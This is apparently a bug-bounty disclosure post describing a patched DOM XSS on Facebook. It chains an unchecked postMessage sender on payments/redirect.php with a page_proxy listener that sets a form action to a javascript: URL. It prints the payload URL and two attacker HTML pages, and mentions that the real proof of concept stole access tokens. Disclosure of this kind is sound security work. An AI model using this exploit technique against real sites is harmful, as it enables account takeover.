---
id: 493
title: 'Facebook DOM Based XSS using postMessage'
date: '2020-11-07T20:01:08+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=493'
wp_featherlight_disable:
    - ''
categories:
    - Uncategorized
---

The first bug could have allowed a malicious user to send cross-origin messages via postMessage method from facebook.com domain. The vulnerable endpoint would accept user controlled content in the request parameters and construct an object with the data supplied to be send with postMessage to opener window. Then, another bug was found and then linked with the previous, this bug was that a script was unsafely constructing and submitting a form based on the data received in messages via an Eventlistener.

**1) Sending messages via postMessage from facebook.com origin**  
  
The vulnerable endpoint was **https://www.facebook.com/payments/redirect.php** . The response of this endpoint could be controlled by many parameters. I found an interesting one which is “type”. This parameter if changed from normally “i” to “rp” it would use postMessage for communication with the opener window ( for “i” it would use window.parent.PaymentsFlows.processIFrame).

<figure class="wp-block-image size-large">![](http://127.0.0.1:4000/assets/img/2020/11/P1-1024x97.png)Attacker controls what being sent with postMessage method. Notice that the target origin was set to **our.intern.facebook.com**. From this i knew that the postMessage method was there to target or only be used by Facebook employees since **our.intern.facebook.com** domain is only “fully” accessible to them and for no-employees, it would redirect to **www.facebook.com**.  
I tried to bypass this for future usage by accessing the same endpoint in another domain which is **our.alpha.facebook.com**. In case of our.alpha.facebook.com/payments/redirect.php, it would return **our.alpha.facebook.com** as the targetOrigin of the postMessage. In the contrary of **our.intern** , **our.alpha** would not redirect to **www**. Notice that our.alpha.facebook.com domain has the same content as www.facebook.com.   
This would allow messages to opener window to pass-through since the targetOrigin condition would be fulfilled and messages would be sent to our.alpha.facebook.com.

At this point, i knew that i should exploit this by looking for pages where interesting message EventListeners exists and which would only accept facebook.com subdomains in the message origin. Only accepting Facebook domains is a big hint that the data received in the message would be used to do something serious. I found a couple of interesting ones but i’ll only mention the one that got me DOM XSS.

**2) The XSS**   
  
Facebook Canvas Apps are served under apps.facebook.com. If you visit an app being served there, you’ll notice that Facebook would load an URL ( previously selected by the app owner ) inside an iframe and then a POST message would be sent to this URL with parameters like “signed_request”.   
Tracing what originated this request, i found that the page was loading “https://www.facebook.com/platform/page_proxy/?version=X” in an iframe too and then sending messages to it with postMessage ( I later found out that this endpoint was used before by another researcher to achieve a [serious bug](https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/) too).  
The page_proxy page contained this code:

![](http://127.0.0.1:4000/assets/img/2020/11/proxy-1024x549.png) page_proxy source codeThis code would do two things. It would send a message with frameName via postMessage to any origin (This was used by Amol but now fixed by checking the frameName). The second thing is it would setup an EventListener and wait for messages. If a message is received and all conditions are fulfilled, it would submit a form after setting its attributes based on the data inside the message.  
What’s interesting about the form construction (submitForm method), is that the action attribute of the form is directly set to “a.data.params.appTabUrl” which is received in the message. The URL inside “appTabUrl” string wasn’t checked if it starts with http/https, for that we can use other schemes like javascript to achieve XSS!

A payload that would construct an object that would fulfill all conditions in the page_proxy script would be something like this:  
  
<pre>
<code class="html">

https://our.alpha.facebook.com/payments/redirect.php?type=rp&amp;name=_self&amp;params\[appTabUrl\]=javascript:alert(1);&amp;params\[signedRequest\]=SIGNED_X&amp;platformAppControllerGetFrameParamsResponse=1
  
OBJ: {“type”:”rp”,”name”:”_self”,”params”:{“appTabUrl”:”javascript:alert(1);”,”signedRequest”:”SIGNED_X”},”platformAppControllerGetFrameParamsResponse”:”1″}

</code>
</pre>


**Exploit**

The victim should visit the attacker website which would have the following code. This would open another page in the attacker website and the current window would be the opener window.

<pre>
<code class="html">
&lt;html&gt;
&lt;button class=&quot;button&quot; onClick=&quot;window.open(&apos;https://attacker/page2.html&apos;, &apos;_blank&apos;);document.location.href = &apos;https://our.alpha.facebook.com/platform/page_proxy/?version=X#_self&apos;;&quot;&gt;
&lt;span class=&quot;icon&quot;&gt;Start Attack&lt;/span&gt;
&lt;/button&gt;
&lt;/html&gt;
</code>
</pre>

Here we won’t redirect directly to page_proxy endpoint since we need to set a timeout to ensure that https://www.facebook.com/platform/page_proxy/ was loaded.  
  
page2.html:


<pre>
<code class="html">
&lt;html&gt;
&lt;script&gt;
setTimeout(function(){ window.location.href = &apos;https://our.alpha.facebook.com/payments/redirect.php?type=rp&amp;merchant_group=86&amp;name=_self&amp;params[appTabUrl]=javascript:alert(1);&amp;params[signedRequest]=SIGNED_X&amp;platformAppControllerGetFrameParamsResponse=1&apos;;} ,3000);
&lt;/script&gt;
&lt;/html&gt;
</code>
</pre>

Here we redirect to the vulnerable endpoint after the timeout. This would only execute alert(1) however the POC i sent would steal a first-party access_token which could be used to takeover the Facebook account. This was easy since we can simply read , for example, the response of an oauth flow to authorize a first-party Facebook application.

**Fix**  
Facebook fixed this bug by completely removing the usage of postMessage in payments redirects ( /payments/redirect.php). Also, appTabUrl is now checked if it starts with https\[ /^https:/.test(a.data.params.appTabUrl) \]

**Timeline**  
Oct 10, 2020— Report Sent   
Oct 10, 2020— Acknowledged by Facebook  
Oct 10, 2020 — $25K in total including bonuses Awarded by Facebook (During BountyCon2020)  
Oct 28, 2020— Fixed by Facebook

</body></html>